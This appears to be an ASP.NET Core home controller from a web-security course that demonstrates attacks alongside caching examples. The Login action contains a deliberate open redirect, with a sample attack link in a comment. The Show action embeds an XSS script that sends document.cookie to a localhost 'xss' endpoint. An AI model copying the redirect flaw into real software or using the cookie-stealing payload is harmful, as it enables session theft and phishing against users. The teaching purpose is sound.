using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using GeekTime.GoodSite.Models;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Authentication.Cookies;
using System.Security.Claims;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Antiforgery;
using Microsoft.Extensions.Caching.Memory;
using Microsoft.Extensions.Caching.Distributed;
using EasyCaching.Core;
using Microsoft.AspNetCore.Cors;

namespace GeekTime.GoodSite.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;

        public HomeController(ILogger<HomeController> logger)
        {
            _logger = logger;
        }

        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 100, Location = ResponseCacheLocation.Any, VaryByQueryKeys = new string[] { "a" })]
        public IActionResult Error([FromServices]IEasyCachingProvider cache)
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }


        [HttpGet]
        public IActionResult Login(string returnUrl)
        {
            ViewData["returnUrl"] = returnUrl;
            return View();
        }

        //攻击链接 https://localhost:5003/Home/Login?returnUrl=https%3A%2F%2Flocalhost%3A5001%2FHome%2FLogin
        [HttpPost]
        public async Task<IActionResult> Login([FromServices]IAntiforgery antiforgery, string name, string password, string returnUrl)
        {
            HttpContext.Response.Cookies.Append("CSRF-TOKEN", antiforgery.GetTokens(HttpContext).RequestToken, new Microsoft.AspNetCore.Http.CookieOptions { HttpOnly = false });
            var identity = new ClaimsIdentity(CookieAuthenticationDefaults.AuthenticationScheme);//一定要声明AuthenticationScheme
            identity.AddClaim(new Claim("Name", "小王"));
            await this.HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, new ClaimsPrincipal(identity));
            if (string.IsNullOrEmpty(returnUrl))
            {
                return Content("登录成功");
            }
            try
            {
                var uri = new Uri(returnUrl);
                ///uri.Host
                return Redirect(returnUrl);
            }
            catch
            {
                return Redirect("/");
            }
            //return Redirect(returnUrl);
        }


        public async Task<IActionResult> Logout()
        {
            await this.HttpContext.SignOutAsync();
            return Content("退出成功");
        }

        [Authorize]
        [ValidateAntiForgeryToken]
        public IActionResult CreateOrder(string itemId, int count)
        {
            _logger.LogInformation("创建了订单itemId:{itemId}，count:{count}", itemId, count);
            return Content("Order Created");
        }



        public IActionResult Show()
        {
            string content = "<p><script>var i=document.createElement('img');document.body.appendChild(i);i.src ='https://localhost:5001/home/xss?c=' +encodeURIComponent(document.cookie);</script></p>";
            ViewData["content"] = content;
            return View();
        }





        [Authorize]
        [HttpPost]
        [EnableCors("api")]
        public object PostCors(string name)
        {
            return new { name = name + DateTime.Now.ToString() };
        }


        [ResponseCache(Duration = 6000, VaryByQueryKeys = new string[] { "query" })]
        public OrderModel GetOrder([FromQuery]string query)
        {
            return new OrderModel { Id = 100, Date = DateTime.Now };
        }


        [ResponseCache(Duration = 6000, VaryByQueryKeys = new string[] { "query" })]
        public IActionResult GetAbc([FromQuery]string query)
        {
            return Content("abc" + DateTime.Now);
        }


        //[ResponseCache(Duration = 6000, VaryByQueryKeys = new string[] { "query" })]
        public IActionResult GetMem([FromServices]IMemoryCache cache, [FromQuery]string query)
        {

            var time = cache.GetOrCreate(query ?? "", entry =>
              {
                  entry.AbsoluteExpirationRelativeToNow = TimeSpan.FromSeconds(600);
                  return DateTime.Now;
              });

            return Content("abc" + time);
        }


        //[ResponseCache(Duration = 6000, VaryByQueryKeys = new string[] { "query" })]
        public IActionResult GetDis([FromServices] IDistributedCache cache, [FromServices]IMemoryCache memoryCache, [FromServices]IEasyCachingProvider easyCaching, [FromQuery]string query)
        {
            #region IDistributedCache
            var key = $"GetDis-{query ?? ""}";
            var time = cache.GetString(key);
            if (string.IsNullOrEmpty(time)) //此处需要考虑并发情形
            {
                var option = new DistributedCacheEntryOptions();
                time = DateTime.Now.ToString();
                cache.SetString(key, time, new DistributedCacheEntryOptions { AbsoluteExpirationRelativeToNow = TimeSpan.FromSeconds(600) });
            }
            #endregion

            #region IEasyCachingProvider
            //var key = $"GetDis-{query ?? ""}";
            //var time = easyCaching.Get(key, () => DateTime.Now.ToString(), TimeSpan.FromSeconds(600));


            #endregion

            return Content("abc" + time);
        }
    }
}
